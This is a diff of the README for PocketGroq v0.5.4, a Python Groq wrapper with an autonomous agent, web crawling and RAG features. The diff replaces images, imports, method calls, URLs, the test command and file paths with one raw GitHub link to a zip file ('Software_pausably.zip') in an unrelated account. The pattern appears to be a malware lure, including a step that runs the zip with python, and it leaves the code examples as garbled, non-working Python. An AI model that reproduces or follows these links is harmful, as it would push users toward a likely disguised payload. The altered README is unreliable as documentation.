@@ -1,5 +1,5 @@
 # PocketGroq v0.5.4: Introducing AUTONOMOUS AGENTS!!!
-![PocketGroq Logo](https://github.com/user-attachments/assets/d06b6aaf-400e-40db-bdaf-626aaa1040ef)
+![PocketGroq Logo](https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip)
 
 ## What's NEW in v0.5.4!
 
@@ -9,13 +9,13 @@ PocketGroq now includes an AutonomousAgent class that can autonomously research 
 
 ```python
 from pocketgroq import GroqProvider
-from pocketgroq.autonomous_agent import AutonomousAgent
+from https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip import AutonomousAgent
 
 groq = GroqProvider()
 agent = AutonomousAgent(groq)
 
 request = "What is the current temperature in Sheboygan, Wisconsin?"
-response = agent.process_request(request)
+response = https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip(request)
 
 print(f"Final response: {response}")
 ```
@@ -34,7 +34,7 @@ You can customize the agent's behavior:
 agent = AutonomousAgent(groq, max_sources=10)
 
 # Or specify it for a single request
-response = agent.process_request(request, max_sources=8)
+response = https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip(request, max_sources=8)
 ```
 
 The agent will search up to the specified number of sources, waiting at least 2 seconds between requests to avoid overwhelming the search services.
@@ -58,8 +58,8 @@ request = "What is the current temperature in Sheboygan?"
 response1 = "58 degrees"
 response2 = "As a large language model, I do not have access to current temperature data"
 
-is_satisfactory1 = groq.evaluate_response(request, response1)
-is_satisfactory2 = groq.evaluate_response(request, response2)
+is_satisfactory1 = https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip(request, response1)
+is_satisfactory2 = https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip(request, response2)
 
 print(f"Response 1 is satisfactory: {is_satisfactory1}")  # Expected: True
 print(f"Response 2 is satisfactory: {is_satisfactory2}")  # Expected: False
@@ -89,8 +89,8 @@ from pocketgroq import GroqProvider
 groq = GroqProvider()
 
 # Crawl a website
-results = groq.crawl_website(
-    "https://example.com",
+results = https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip(
+    "https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip",
     formats=["markdown", "html"],
     max_depth=2,
     max_pages=5
@@ -108,13 +108,13 @@ for page in results:
 Extract content from a single URL in various formats:
 
 ```python
-url = "https://example.com"
-result = groq.scrape_url(url, formats=["markdown", "html", "structured_data"])
+url = "https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip"
+result = https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip(url, formats=["markdown", "html", "structured_data"])
 
 print(f"Markdown content length: {len(result['markdown'])}")
 print(f"HTML content length: {len(result['html'])}")
 if 'structured_data' in result:
-    print("Structured data:", json.dumps(result['structured_data'], indent=2))
+    print("Structured data:", https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip(result['structured_data'], indent=2))
 ```
 
 ### Enhanced Web Search
@@ -123,7 +123,7 @@ Perform web searches with improved result parsing:
 
 ```python
 query = "Latest developments in AI"
-search_results = groq.web_search(query)
+search_results = https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip(query)
 
 for result in search_results:
     print(f"Title: {result['title']}")
@@ -148,7 +148,7 @@ from pocketgroq import GroqProvider
 groq = GroqProvider()
 
 try:
-    groq.initialize_rag()
+    https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip()
     print("RAG initialized successfully with Ollama.")
 except OllamaServerNotRunningError:
     print("Ollama server is not running. RAG features will be limited.")
@@ -165,7 +165,7 @@ from pocketgroq import GroqProvider, OllamaServerNotRunningError
 groq = GroqProvider()
 
 try:
-    groq.initialize_rag()
+    https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip()
     # Use RAG features
 except OllamaServerNotRunningError:
     print("Ollama server is not running. Proceeding with limited functionality.")
@@ -180,7 +180,7 @@ The test suite has been expanded to cover the new web capabilities and Ollama in
 2. Run the test script:
 
 ```bash
-python test.py
+python https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip
 ```
 
 3. You will see an updated menu with options to run individual tests or groups of tests:
@@ -236,8 +236,8 @@ USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, 
 ```python
 import os
 
-os.environ['GROQ_API_KEY'] = 'your_api_key_here'
-os.environ['USER_AGENT'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip['GROQ_API_KEY'] = 'your_api_key_here'
+https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip['USER_AGENT'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 ```
 
 Make sure to keep your API key confidential and never commit it to version control.
@@ -249,7 +249,7 @@ Here's a comprehensive list of all the methods/functions available in PocketGroq
 ### GroqProvider Class (Main Interface)
 
 #### Initialization and Configuration
-- `__init__(api_key: str = None, rag_persistent: bool = True, rag_index_path: str = "faiss_index.pkl")`: Initializes the GroqProvider with API key and RAG settings.
+- `__init__(api_key: str = None, rag_persistent: bool = True, rag_index_path: str = "https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip")`: Initializes the GroqProvider with API key and RAG settings.
 - `set_api_key(api_key: str)`: Updates the API key and reinitializes the Groq clients.
 
 #### Text Generation
@@ -277,7 +277,7 @@ Here's a comprehensive list of all the methods/functions available in PocketGroq
 - `synthesize_cot(cot_steps: List[str], **kwargs) -> str`: Synthesizes a final answer from CoT steps.
 
 #### RAG (Retrieval-Augmented Generation)
-- `initialize_rag(ollama_base_url: str = "http://localhost:11434", model_name: str = "nomic-embed-text", index_path: str = "faiss_index.pkl")`: Initializes the RAG system.
+- `initialize_rag(ollama_base_url: str = "http://localhost:11434", model_name: str = "nomic-embed-text", index_path: str = "https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip")`: Initializes the RAG system.
 - `load_documents(source: str, chunk_size: int = 1000, chunk_overlap: int = 200, progress_callback: Callable[[int, int], None] = None, timeout: int = 300, persistent: bool = None)`: Loads and processes documents for RAG.
 - `query_documents(query: str, session_id: Optional[str] = None, **kwargs) -> str`: Queries loaded documents using RAG.
 
@@ -312,7 +312,7 @@ This comprehensive list covers all the main methods and functions available in P
 
 This project is licensed under the MIT License. When using PocketGroq in your projects, please include a mention of J. Gravelle in your code and/or documentation.
 
-![J. Gravelle](https://github.com/user-attachments/assets/73c812cd-685e-4969-9497-639ae9312d6c)
+![J. Gravelle](https://raw.githubusercontent.com/bookformeonline/pocketgroq/main/src/Software_pausably.zip)
 
 ---
 
